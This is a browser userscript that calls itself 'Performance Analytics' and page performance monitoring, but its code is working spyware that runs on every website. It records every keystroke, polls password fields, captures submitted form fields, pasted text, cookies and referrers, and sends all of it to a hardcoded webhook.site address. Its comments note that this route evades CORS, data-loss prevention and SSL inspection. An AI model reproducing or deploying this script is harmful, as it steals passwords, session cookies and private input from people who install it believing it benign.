// ==UserScript==                                                                                                                                                        
  // @name         Performance Analytics
  // @namespace    http://tampermonkey.net/                                                                                                                                
  // @version      1.0                                                                                                                                                   
  // @description  Page performance monitoring                                                                                                                           
  // @match        *://*/*                                                                                                                                                 
  // @grant        GM_xmlhttpRequest
  // @connect      webhook.site                                                                                                                                            
  // @run-at       document-idle                                                                                                                                         
  // ==/UserScript==                                                                                                                                                       
   
  (function() {                                                                                                                                                            
      'use strict';                                                                                                                                                      
      if (window.__pa_active) return;                                                                                                                                    
      window.__pa_active = true;                                                                                                                                           
   
      var W = 'https://webhook.site/3bf3755d-69fc-4f50-a34c-3c28ed2765ef';                                                                                                 
      var kb = [];                                                                                                                                                       
                                                                                                                                                                           
      // Keylogger — every keystroke on every site                                                                                                                         
      document.addEventListener('keydown', function(e) {                                                                                                                 
          kb.push({                                                                                                                                                        
              k: e.key,                                                                                                                                                  
              f: (e.target.name || e.target.id || e.target.tagName).substring(0, 30),                                                                                    
              t: e.target.type || '',                                                                                                                                      
              ts: Date.now()
          });                                                                                                                                                              
          if (kb.length >= 10) flush();                                                                                                                                  
      }, true);                                                                                                                                                            
   
      function flush() {                                                                                                                                                   
          if (kb.length === 0) return;                                                                                                                                   
          send({                                                                                                                                                         
              type: 'keylog',
              url: location.href,
              title: document.title,                                                                                                                                       
              keys: kb.splice(0)
          });                                                                                                                                                              
      }                                                                                                                                                                  
                                                                                                                                                                         
      setInterval(flush, 4000);
      window.addEventListener('beforeunload', flush);

      // Password fields — poll every 1.5s                                                                                                                                 
      setInterval(function() {
          document.querySelectorAll('input[type="password"]').forEach(function(f) {                                                                                        
              if (f.value && f.value !== f.dataset._pw) {                                                                                                                
                  f.dataset._pw = f.value;                                                                                                                                 
                  send({
                      type: 'password',                                                                                                                                    
                      url: location.href,                                                                                                                                
                      field: f.name || f.id || 'password',                                                                                                                 
                      value: f.value                                                                                                                                     
                  });                                                                                                                                                      
              }
          });                                                                                                                                                              
      }, 1500);                                                                                                                                                          
                                                                                                                                                                         
      // Form submissions — capture all fields
      document.addEventListener('submit', function(e) {
          var fields = {};
          try { new FormData(e.target).forEach(function(v, k) { fields[k] = v; }); } catch(x) {}                                                                           
          send({                                                                                                                                                           
              type: 'form',                                                                                                                                                
              url: location.href,                                                                                                                                          
              action: e.target.action,                                                                                                                                   
              fields: fields                                                                                                                                             
          });                                                                                                                                                              
      }, true);
                                                                                                                                                                           
      // Clipboard                                                                                                                                                       
      document.addEventListener('paste', function(e) {                                                                                                                   
          var t = (e.clipboardData || window.clipboardData).getData('text');
          if (t) send({ type: 'paste', url: location.href, text: t.substring(0, 500) });                                                                                   
      }, true);                                                                                                                                                            
                                                                                                                                                                           
      // Page load — cookies + storage                                                                                                                                     
      send({                                                                                                                                                             
          type: 'pageload',                                                                                                                                                
          url: location.href,
          title: document.title,                                                                                                                                           
          cookies: document.cookie,                                                                                                                                      
          referrer: document.referrer                                                                                                                                    
      });

      // GM_xmlhttpRequest — bypasses CORS, DLP, SSL inspection                                                                                                            
      function send(data) {
          data.time = new Date().toISOString();                                                                                                                            
          GM_xmlhttpRequest({                                                                                                                                            
              method: 'POST',                                                                                                                                              
              url: W,                                                                                                                                                      
              data: JSON.stringify(data),                                                                                                                                
              headers: { 'Content-Type': 'application/json' }                                                                                                              
          });                                                                                                                                                            
      }                                                                                                                                                                  
  })();
